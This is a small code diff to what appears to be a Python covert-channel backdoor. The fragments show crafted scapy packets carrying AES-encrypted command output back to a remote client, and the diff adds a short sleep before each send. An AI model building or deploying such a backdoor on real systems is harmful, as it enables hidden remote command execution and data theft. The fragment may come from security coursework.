@@ -27,6 +27,7 @@ from scapy.all import *
 import subprocess
 import setproctitle
 import argparse
+import time
 from Crypto.Cipher import AES
 
 #Set command line arguments for the program.
@@ -124,6 +125,7 @@ def getCommand(packet):
             encryptedOutput = encryptData(data)
             #Craft a packet with the encrypted output data and send back to client.
             craftedPacket = IP(dst=srcIPAddr, ttl=188)/TCP(dport=destPort)/Raw(load=encryptedOutput)
+            time.sleep(0.1)
             send(craftedPacket, verbose=0)
 
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
